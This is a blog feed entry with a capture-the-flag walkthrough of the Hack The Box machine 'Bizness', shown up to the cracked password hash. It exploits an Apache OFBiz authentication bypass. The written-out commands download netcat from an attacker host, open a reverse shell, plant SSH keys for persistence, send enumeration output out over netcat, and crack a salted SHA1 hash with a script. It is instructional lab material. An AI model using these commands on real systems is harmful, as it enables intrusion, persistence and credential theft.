<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://emdeh.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://emdeh.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-01-23T05:02:53+00:00</updated><id>https://emdeh.github.io/feed.xml</id><title type="html">emdeh</title><subtitle>If you can&apos;t explain it simply, you don&apos;t understand it well enough. </subtitle><entry><title type="html">Bizness</title><link href="https://emdeh.github.io/blog/2024/bizness-walkthrough/" rel="alternate" type="text/html" title="Bizness"/><published>2024-01-23T14:14:00+00:00</published><updated>2024-01-23T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/bizness-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/bizness-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>Bizness is an easy box with a relatively convoluted privilege escalation that is not-so-easy. It involves enumerating a web application running an open-source enterprise resource planning (ERP) system called <strong>Apache OFBiz</strong>. The ERP has an <strong>authentication bypass</strong> vulnerability that allows for a subsequent an <strong>Server Side Request Forgery (SSRF)</strong> vulnerability to be exploited to obtain a reverse shell.</p> <p>From there the system is enumerated manually and with the help of Linpeas to locate a custom-salted hash. Once the hash is cracked, it is just a matter of switching to the root user to obtain the final flag.</p> <h2 id="methods">Methods</h2> <h3 id="authentication-bypass">Authentication bypass</h3> <p>An authentication bypass vulnerability is a security flaw that allows an attacker to access a system, application, or network without going through the standard authentication process. This type of vulnerability effectively undermines the security mechanisms that verify the identity of a user or entity, granting unauthorized access.</p> <p>Key aspects of an authentication bypass vulnerability include:</p> <ol> <li> <p><strong>Bypassing Security Checks:</strong> The attacker finds a way to circumvent or exploit weaknesses in the authentication process, such as exploiting code flaws, misconfigurations, or logic errors.</p> </li> <li> <p><strong>Unauthorised Access:</strong> As a result, the attacker gains access to restricted areas of the system or application, often with the same privileges as a legitimate user.</p> </li> <li> <p><strong>Potential Impact:</strong> This can lead to various security issues, such as data breaches, privilege escalation, and system compromise.</p> </li> <li> <p><strong>Common Causes:</strong> Causes might include inadequate input validation, insecure direct object references, or flawed session management.</p> </li> </ol> <h3 id="server-side-request-forgery-ssrf">Server Side Request Forgery (SSRF)</h3> <p>Server-Side Request Forgery (SSRF) is a type of web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker’s choosing. This vulnerability occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing an attacker to manipulate the requests made by the server.</p> <p>In an SSRF attack, the attacker can:</p> <ol> <li> <p><strong>Access Services Inaccessible to the Public:</strong> The attacker can target internal systems behind firewalls that are normally inaccessible from the external network, including services running on the server itself (like databases or internal web applications).</p> </li> <li> <p><strong>Manipulate Requests:</strong> The attacker might manipulate the server to send requests to unintended locations, possibly leading to information disclosure, privilege escalation, or other malicious activities.</p> </li> <li> <p><strong>Conduct Port Scanning:</strong> SSRF can be used to scan ports and find services running on servers within the organization’s internal network.</p> </li> <li> <p><strong>Exploit Vulnerable Services and APIs:</strong> If the internal systems have vulnerabilities, SSRF can provide a pathway for exploiting these vulnerabilities.</p> </li> </ol> <p>Mitigating SSRF typically involves validating and sanitizing all user input, especially URLs, implementing strict access controls, and using allowlists for external services that the application can interact with.</p> <p>SSRF is a significant security concern in modern web applications, especially those that interact with complex systems and external services.</p> <h2 id="tools">Tools</h2> <ul> <li><strong>Nmap</strong> for initial network enumeration.</li> <li><strong><a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">CVE-2023-51467 POC</a>)</strong> for vulnerability scanning and initial access.</li> <li><strong><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">Linpeas</a></strong> for system enumeration.</li> <li><strong><a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969">Custom python script</a></strong> to convert custom SHA hash.</li> </ul> <h2 id="tactics">Tactics</h2> <ul> <li><strong>Establishing persistence</strong> via rogue SSH keys.</li> </ul> <hr/> <h1 id="enumeration">Enumeration</h1> <p>As always, enumeration begins with an Nmap scan.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.129.8.141 | <span class="nb">tee </span>nmap-output.txt    
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report <span class="k">for </span>10.129.8.141
Host is up <span class="o">(</span>0.31s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 <span class="o">(</span>RSA<span class="o">)</span>
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
|_http-title: Did not follow redirect to https://bizness.htb/
| ssl-cert: Subject: <span class="nv">organizationName</span><span class="o">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span class="o">=</span>Some-State/countryName<span class="o">=</span>UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>66.11 seconds
                                                                
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Three ports open: <ul> <li>22</li> <li>80</li> <li>443</li> </ul> </li> <li>Domain name http://bizness.htb</li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>The domain <code class="language-plaintext highlighter-rouge">bizness.htb</code> can be added to the local hosts file:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.8.141 bizness.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div> <p>This makes it reachable and reveals a simple landing page:</p> <p><img src="/assets/img/20240123-bizness/20240123-page.png" alt="20240123-page.png" class="auto-resize"/></p> <p>At the bottom of the page, it states the site is powered by <strong>Apache OFBiz</strong>.</p> <p><img src="/assets/img/20240123-bizness/20240123-pagepower.png" alt="20240123-pagepower.png" class="auto-resize"/></p> <h3 id="what-is-apache-ofbiz">What is Apache OFBiz</h3> <p>Apache OFBiz (Open For Business) is an open-source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise. OFBiz includes modules for inventory management, order management, customer relationship management (CRM), e-commerce, accounting, and supply chain management, among others.</p> <p>A Google search for <em>Apache OFBiz vulnerabilities</em> returns a critical zero-day (CVE-2023-51467).</p> <h3 id="what-is-cve-2023-51467">What is CVE-2023-51467</h3> <p>CVE-2023-51467 is a critical vulnerability in Apache OFBiz, involving an authentication bypass with a CVSS score of 9.8. The vulnerability, particularly affecting the <code class="language-plaintext highlighter-rouge">/webtools/control/ping</code> HTTP endpoint, allows unauthorised access without authentication.</p> <p>While initially demonstrating the vulnerability’s existence, further analysis revealed its potential for arbitrary code execution, including executing payloads directly from memory. This flaw enables attackers not only to bypass authentication but also to potentially exploit Server-Side Request Forgery (SSRF) vulnerabilities.</p> <hr/> <h2 id="apache-ofbiz-enumeration">Apache OFBiz enumeration</h2> <p>Without knowing the version of Apache OFBiz, it is unclear whether the target is vulnerable to the zero-day. However, a search of GitHub revealed numerous PoCs to scan a target to confirm or deny if the ERP is vulnerable.</p> <p>One such scanner is <a href="https://github.com/Chocapikk/CVE-2023-51467"> Chocapikk/CVE-2023-51467: Apache OfBiz Auth Bypass Scanner for CVE-2023-51467</a>, which was used to confirm the target is, in fact, vulnerable.</p> <p>First the scanner is cloned from the repository and the dependencies installed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>git clone https://github.com/Chocapikk/CVE-2023-51467.git

pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt 
</code></pre></div></div> <p>Then the scanner can be executed by passing the domain and an output location. The output location is useful if a list of domains were being scanned. As the output shows, the <code class="language-plaintext highlighter-rouge">bizness.htb</code> is indeed vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py <span class="nt">-u</span> bizness.htb <span class="nt">-o</span> ~/Documents/htb-machines/bizness/scans/output.txt
<span class="o">[</span>00:00:49] Vulnerable URL found: bizness.htb, Response: PONG                                                                                                                  exploit.py:53
|████████████████████████████████████████| 1/1 <span class="o">[</span>100%] <span class="k">in </span>3.3s <span class="o">(</span>0.30/s<span class="o">)</span> 

</code></pre></div></div> <hr/> <h1 id="exploitation">Exploitation</h1> <p>Another exploit scanner which includes an exploit POC as well was found.</p> <p>Using <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">jakabakos/Apache-OFBiz-Authentication-Bypass</a> the target was reconfirmed to be vulnerable.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>python3 exploit.py <span class="nt">--url</span> http://bizness.htb                                                                                                          │
<span class="o">[</span>+] Scanning started...                                                                                                                                  │
<span class="o">[</span>+] Apache OFBiz instance seems to be vulnerable.  
</code></pre></div></div> <p>This particular POC included the exploit itself, which will provide <strong>remote code execution</strong> on the target. Theoretically this can be leveraged to induce the server to request a payload from a malicious server. In this instance, it can be used to move <code class="language-plaintext highlighter-rouge">netcat</code> onto the target to establish a reverse-shell.</p> <p>To do this <code class="language-plaintext highlighter-rouge">nc</code> can be copied to a working directory:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/bin/nc ./
</code></pre></div></div> <p>Then a simple python webserver can be started to serve the binary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div> <p>Once <code class="language-plaintext highlighter-rouge">netcat</code> is ready to be served, the exploit can be used to remotely execute a command on the target to fetch binary:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py <span class="nt">--url</span> http://bizness.htb <span class="nt">--cmd</span> <span class="s2">"wget http://10.10.14.5/nc"</span>  

<span class="o">[</span>+] Generating payload...                                                               
Picked up _JAVA_OPTIONS: <span class="nt">-Dawt</span>.useSystemAAFontSettings<span class="o">=</span>on <span class="nt">-Dswing</span>.aatext<span class="o">=</span><span class="nb">true</span>           
<span class="o">[</span>+] Payload generated successfully.                                                     
<span class="o">[</span>+] Sending malicious serialized payload...                                             
<span class="o">[</span>+] The request has been successfully sent. Check the result of the command.   
</code></pre></div></div> <p>Now that <code class="language-plaintext highlighter-rouge">netcat</code> is on the target, a listener can be established on a local machine to receive a reverse-shell:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 4321
</code></pre></div></div> <hr/> <blockquote> <p>The command <code class="language-plaintext highlighter-rouge">rlwrap -cAr nc -lvnp 9010</code> is a combination of several utilities and options that are commonly used in reverse shell setups. Here’s a breakdown of the command:</p> <ol> <li><strong><code class="language-plaintext highlighter-rouge">rlwrap</code></strong>: <ul> <li>This is a utility that provides readline capabilities to commands that may not have them. Readline allows for command line editing, persistent history, and auto-completion. In the context of this command, <code class="language-plaintext highlighter-rouge">rlwrap</code> is used to enhance the functionality of <code class="language-plaintext highlighter-rouge">nc</code> (Netcat).</li> </ul> </li> <li><strong><code class="language-plaintext highlighter-rouge">-cAr</code></strong>: These are options for <code class="language-plaintext highlighter-rouge">rlwrap</code>: <ul> <li><code class="language-plaintext highlighter-rouge">-c</code>: Enables command completion.</li> <li><code class="language-plaintext highlighter-rouge">-A</code>: Enables command auto-completion.</li> <li><code class="language-plaintext highlighter-rouge">-r</code>: Keeps a history of commands.</li> </ul> </li> <li><strong><code class="language-plaintext highlighter-rouge">-lvnp 4321</code></strong>: These are options for <code class="language-plaintext highlighter-rouge">nc</code>: <ul> <li><code class="language-plaintext highlighter-rouge">-l</code>: Puts Netcat into listening mode, where it waits for incoming connections.</li> <li><code class="language-plaintext highlighter-rouge">-v</code>: Verbose mode. Netcat will provide more information about what it’s doing.</li> <li><code class="language-plaintext highlighter-rouge">-n</code>: No DNS. Tells Netcat not to resolve hostnames via DNS. This can speed up operations if DNS resolution is not required.</li> <li><code class="language-plaintext highlighter-rouge">-p 4321</code>: Specifies the port number on which Netcat will listen for incoming connections.</li> </ul> </li> </ol> <h2 id="so-putting-it-all-together-rlwrap--car-nc--lvnp-4321-runs-netcat-in-listening-mode-on-port-4321-with-enhanced-readline-capabilities-provided-by-rlwrap-this-setup-is-typically-used-when-youre-expecting-to-receive-a-reverse-shell-and-you-want-the-ability-to-interact-with-that-shell-more-effectively-using-command-history-and-completion">So, putting it all together, <code class="language-plaintext highlighter-rouge">rlwrap -cAr nc -lvnp 4321</code> runs Netcat in listening mode on port 4321 with enhanced readline capabilities provided by <code class="language-plaintext highlighter-rouge">rlwrap</code>. This setup is typically used when you’re expecting to receive a reverse shell, and you want the ability to interact with that shell more effectively using command history and completion.</h2> </blockquote> <p>Once a listener is active, a subsequent command can be sent to the target which will execute <code class="language-plaintext highlighter-rouge">netcat</code> on the target to establish the reverse shell.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py <span class="nt">--url</span> https://bizness.htb <span class="nt">--cmd</span> <span class="s2">"nc 10.10.14.5 4321 -c /bin/bash"</span>
</code></pre></div></div> <p>The reverse shell is then caught by the listener.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> 4321  
listening on <span class="o">[</span>any] 4321 ...
connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.8.141] 38270
<span class="nb">whoami
</span>ofbiz
</code></pre></div></div> <p>Once the reverse-shell is established, it can be upgraded with a simple python script to improve the interactivity.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="sh">"</span><span class="s">import pty;pty.spawn(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span>
</code></pre></div></div> <p>A quick look around and the first flag is found.</p> <p><img src="/assets/img/20240123-bizness/20240123-userflag.png" alt="20240123-userflag.png" class="auto-resize"/></p> <hr/> <h1 id="establishing-persistence">Establishing persistence</h1> <p>It can be helpful to establish persistence on a target to ensure it can be easily accessed without having to exploit it again through the initial vulnerability. This can help evade detection and ensure access in the event the initial attack vector is mitigated.</p> <p>One way to do this is to place an <strong>authorized ssh key</strong> on the target.</p> <p>To do this, the <code class="language-plaintext highlighter-rouge">.ssh</code> folder is required in the <code class="language-plaintext highlighter-rouge">/home/ofbiz</code> directory.</p> <p>Within this folder an <code class="language-plaintext highlighter-rouge">authorized_keys</code> file is needed.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> .ssh

<span class="nb">cd</span> .ssh

<span class="nb">touch </span>authorized_keys
</code></pre></div></div> <p>On the machine from which the target will be accessed, <strong>ssh keys</strong> are required.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh-keygen

Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/ofbiz/.ssh/id_rsa<span class="o">)</span>: 

Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 

Enter same passphrase again: 

Your identification has been saved <span class="k">in</span> /home/ofbiz/.ssh/id_rsa
Your public key has been saved <span class="k">in</span> /home/ofbiz/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:&lt;REDACTED&gt;+
</code></pre></div></div> <p>Then the public key needs to be copied over and placed in the <code class="language-plaintext highlighter-rouge">/home/ofbiz/.ssh/authorized_keys</code> file. This can be achieved with:</p> <p><code class="language-plaintext highlighter-rouge">echo "contents-of-public-key" &gt; /home/ofbiz/.ssh/authorized_keys</code></p> <p>Then the private key needs <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> permission, which will enable ssh login with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /path/to/private0-key ofbiz@IP
</code></pre></div></div> <p>As long as the key remains in the authorized_keys file, this method can be used to return to the target as required.</p> <hr/> <h1 id="system-enumeration">System enumeration</h1> <p>Enumerating the system for a vector to achieve privilege escalation was rather challenging for an easy box.</p> <h2 id="linepeas">Linepeas</h2> <p>A good starting point is to move <code class="language-plaintext highlighter-rouge">linpeas</code> onto the system and execute it. The binary can be moved over using the <code class="language-plaintext highlighter-rouge">python -m http.server</code>.</p> <p>Once there it can be ran with:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash linpeas.sh | <span class="nb">tee </span>output.txt
</code></pre></div></div> <p>This will send the output to both the console and a txt file for later review.</p> <p>The output can be sent back to a local machine using <code class="language-plaintext highlighter-rouge">netcat</code> again.</p> <p>Firstly start another <code class="language-plaintext highlighter-rouge">netcat</code> listener on the receiving machine:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 4321 <span class="o">&gt;</span> ~/path/to/a/receiving/file.txt
</code></pre></div></div> <p>Then, on the target, send the file using:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.14.5 4321 &lt; output.txt
</code></pre></div></div> <p>This series of commands essentially streams the contents of the output.txt on the target machine, back to the output.txt file on the receiving machine.</p> <h2 id="file-searching">File searching</h2> <p>Reviewing the Linpeas output eventually leads to a writeable directory <code class="language-plaintext highlighter-rouge">/opt/ofbiz/runtime/data/derby</code></p> <p>After much reading, it was found in an <a href="https://cwiki.apache.org/confluence/display/OFBIZ/Apache+OFBiz+Technical+Production+Setup+Guide">Apache wiki</a> that OFBiz uses an embedded Java database called <strong>Derby</strong>.</p> <p><img src="/assets/img/20240123-bizness/20240123-wikiresearch.png" alt="20240123-wikiresearch.png" class="auto-resize"/></p> <p>After reviewing the file system structure, an interesting README is located: inside the database directory.</p> <p><img src="/assets/img/20240123-bizness/20240123-readme-warning.png" alt="20240123-readme-warning.png" class="auto-resize"/></p> <p>The <code class="language-plaintext highlighter-rouge">seg0</code> database contains a number of .dat files.</p> <blockquote> <p><em>ChatGPT was kind enough to explain that .dat files in the context of Apache OFBiz are used for data loading purposes. Given the README notice, it’s possible that these files might contain credentials.</em></p> </blockquote> <p>The command <code class="language-plaintext highlighter-rouge">find seg0 -type f -exec cat {} \; &gt; dir.txt</code> can be used to create a file that contains the combined contents of all the files found in the <code class="language-plaintext highlighter-rouge">seg0</code> directory and its subdirectories.</p> <p>This can be useful for consolidating data or logs spread across multiple files into a single document for easier analysis or review.</p> <hr/> <blockquote> <p>The command breakdown is:</p> <ol> <li> <p><strong><code class="language-plaintext highlighter-rouge">find seg0 -type f</code></strong>:</p> <ul> <li><code class="language-plaintext highlighter-rouge">find</code>: This is a command used to search for files in a directory &gt;hierarchy.</li> <li><code class="language-plaintext highlighter-rouge">seg0</code>: This specifies the directory where the <code class="language-plaintext highlighter-rouge">find</code> command starts its search. In this case, it’s looking in the <code class="language-plaintext highlighter-rouge">seg0</code> directory.</li> <li><code class="language-plaintext highlighter-rouge">-type f</code>: This option tells <code class="language-plaintext highlighter-rouge">find</code> to look for files (not directories).</li> </ul> </li> <li> <p><strong><code class="language-plaintext highlighter-rouge">-exec cat {} \;</code></strong>:</p> <ul> <li><code class="language-plaintext highlighter-rouge">-exec</code>: This option of the <code class="language-plaintext highlighter-rouge">find</code> command allows you to execute another command on each of the files found.</li> <li><code class="language-plaintext highlighter-rouge">cat {}</code>: This is the command that <code class="language-plaintext highlighter-rouge">find</code> will execute on each file. <code class="language-plaintext highlighter-rouge">cat</code> is a standard Unix utility that reads files and outputs their content. The <code class="language-plaintext highlighter-rouge">{}</code> is a placeholder for each file <code class="language-plaintext highlighter-rouge">find</code> locates.</li> <li><code class="language-plaintext highlighter-rouge">\;</code>: This is a delimiter that indicates the end of the <code class="language-plaintext highlighter-rouge">exec</code> command.</li> </ul> </li> <li> <p><strong><code class="language-plaintext highlighter-rouge">&gt; dir.txt</code></strong>:</p> <ul> <li><code class="language-plaintext highlighter-rouge">&gt;</code>: This is an output redirection operator in Unix/Linux. It directs the output from the preceding command to a file.</li> <li><code class="language-plaintext highlighter-rouge">dir.txt</code>: This is the file into which the output of the previous commands will be saved.</li> </ul> </li> </ol> </blockquote> <hr/> <p>The command <code class="language-plaintext highlighter-rouge">strings dir.txt | grep SHA</code> can then be used to extract printable strings from the consolidated file and search for any occurrence of text. After many attempts, the string “SHA” was tried.</p> <p>This revealed a hash.</p> <p><img src="/assets/img/20240123-bizness/20240123-hash.png" alt="20240123-hash.png" class="auto-resize"/></p> <p>The hash has a salt and would need to be converted to hexadecimal to be cracked by Hashcat.</p> <p>Despite trying to do this with the help of ChatGPT, I was unable to obtain a hash that was suitable for Hashcat.</p> <p>In the end, I found a python script that was able to do this, thanks to this <a href="https://medium.com/@mastercode112/htb-bizness-easy-writeup-bacce3ba0969">write up</a>.</p> <p>The script is:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">hashlib</span>  
<span class="kn">import</span> <span class="n">base64</span>  
<span class="kn">import</span> <span class="n">os</span>  
<span class="k">def</span> <span class="nf">cryptBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">hash_type</span><span class="p">:</span>  
<span class="n">hash_type</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SHA</span><span class="sh">"</span>  
<span class="k">if</span> <span class="ow">not</span> <span class="n">salt</span><span class="p">:</span>  
<span class="n">salt</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>  
<span class="n">hash_obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hash_type</span><span class="p">)</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>  
<span class="n">hashed_bytes</span> <span class="o">=</span> <span class="n">hash_obj</span><span class="p">.</span><span class="nf">digest</span><span class="p">()</span>  
<span class="n">result</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">$</span><span class="si">{</span><span class="n">hash_type</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">salt</span><span class="si">}</span><span class="s">$</span><span class="si">{</span><span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">hashed_bytes</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>  
<span class="k">return</span> <span class="n">result</span>  
<span class="k">def</span> <span class="nf">getCryptedBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>  
<span class="k">try</span><span class="p">:</span>  
<span class="n">hash_obj</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">hash_type</span><span class="p">)</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">salt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="n">hash_obj</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>  
<span class="n">hashed_bytes</span> <span class="o">=</span> <span class="n">hash_obj</span><span class="p">.</span><span class="nf">digest</span><span class="p">()</span>  
<span class="k">return</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">hashed_bytes</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="s">+</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">.</span><span class="sh">'</span><span class="p">)</span>  
<span class="k">except</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">NoSuchAlgorithmException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
<span class="k">raise</span> <span class="nc">Exception</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error while computing hash of type </span><span class="si">{</span><span class="n">hash_type</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>  
<span class="n">hash_type</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SHA1</span><span class="sh">"</span>  
<span class="n">salt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">d</span><span class="sh">"</span>  
<span class="n">search</span> <span class="o">=</span> <span class="sh">"</span><span class="s">REDACTED</span><span class="sh">"</span>  
<span class="n">wordlist</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/usr/share/wordlists/rockyou.txt</span><span class="sh">'</span>  
<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="sh">'</span><span class="s">latin-1</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">password_list</span><span class="p">:</span>  
<span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">password_list</span><span class="p">:</span>  
<span class="n">value</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="nf">strip</span><span class="p">()</span>  
<span class="n">hashed_password</span> <span class="o">=</span> <span class="nf">cryptBytes</span><span class="p">(</span><span class="n">hash_type</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">value</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>  
<span class="c1"># print(hashed_password)  
</span><span class="k">if</span> <span class="n">hashed_password</span> <span class="o">==</span> <span class="n">search</span><span class="p">:</span>  
<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Found Password:</span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s">, hash:</span><span class="si">{</span><span class="n">hashed_password</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div> <p>This script reads through a list of potential passwords (<code class="language-plaintext highlighter-rouge">rockyou.txt</code>), hashes each one using the specified algorithm and salt, and then compares the resulting hash to a target hash. If a match is found, it prints the plaintext password along with its hash.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ <span class="nv">$python3</span> solve.py 
Found Password:REDACTED, <span class="nb">hash</span>:<span class="nv">$SHA1$d$uP0_QaVBpDWFeo8</span><span class="nt">-REDACTED</span><span class="o">=</span>

